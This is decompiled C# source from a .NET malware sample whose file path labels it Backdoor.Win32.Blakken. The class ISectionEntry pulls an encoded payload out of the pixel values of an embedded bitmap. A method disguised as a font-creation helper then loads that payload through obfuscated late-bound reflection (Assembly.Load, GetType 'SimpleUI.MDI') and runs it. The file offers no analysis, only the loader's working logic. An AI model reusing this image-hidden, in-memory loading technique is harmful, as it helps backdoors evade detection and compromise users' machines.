// Decompiled with JetBrains decompiler
// Type: ManagerMarket.ISectionEntry
// Assembly: cDisplayClass310, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8C7A4461-A171-4409-B75B-AB5BE5ABB986
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\Backdoor.Win32.Blakken.vor-a227cf3f5fb90a859db6b3a95e95ead7b01dc01615de5433710205c6cd58ec78.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace ManagerMarket
{
  internal class ISectionEntry
  {
    public ISectionEntry(bool c1)
    {
      int index = 0;
      Bitmap infinite = ManagerMarket.My.Resources.Resources.Infinite;
      byte[] TaskCanceledException = new byte[50689];
      int num1 = checked (infinite.Size.Width - 1);
      int x = 0;
      while (x <= num1)
      {
        int num2 = checked (infinite.Height - 1);
        int y = 0;
        while (y <= num2)
        {
          int win32 = ColorTranslator.ToWin32(infinite.GetPixel(x, y));
          TaskCanceledException[index] = checked ((byte) win32);
          checked { ++y; }
        }
        checked { ++index; }
        checked { ++x; }
      }
      this.MessageSurrogateFilter("Arial Bold", 16, true, false, false, (object) TaskCanceledException);
    }

    public Font MessageSurrogateFilter(
      string fontName,
      int fontSize,
      bool isBold,
      bool isItalic,
      bool isStrikeout,
      object TaskCanceledException)
    {
      NewLateBinding.LateCall(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(LateBinding.LateGet((object) (Assembly) typeof (Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
      {
        TaskCanceledException
      }), (Type) null, "GetType", new object[1]
      {
        (object) "SimpleUI.MDI"
      }, (string[]) null, (bool[]) null)), (Type) null, "GetProperties", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), new object[1]
      {
        (object) 0
      }, (string[]) null), (Type) null, "SetValue", new object[3]
      {
        null,
        (object) CompatibilityMap.ReflectionEmit,
        null
      }, (string[]) null, (Type[]) null, (bool[]) null, true);
      FontStyle style = FontStyle.Regular;
      if (isBold)
        style |= FontStyle.Bold;
      if (isItalic)
        style |= FontStyle.Italic;
      if (isStrikeout)
        style |= FontStyle.Strikeout;
      return new Font(fontName, (float) fontSize, style);
    }
  }
}
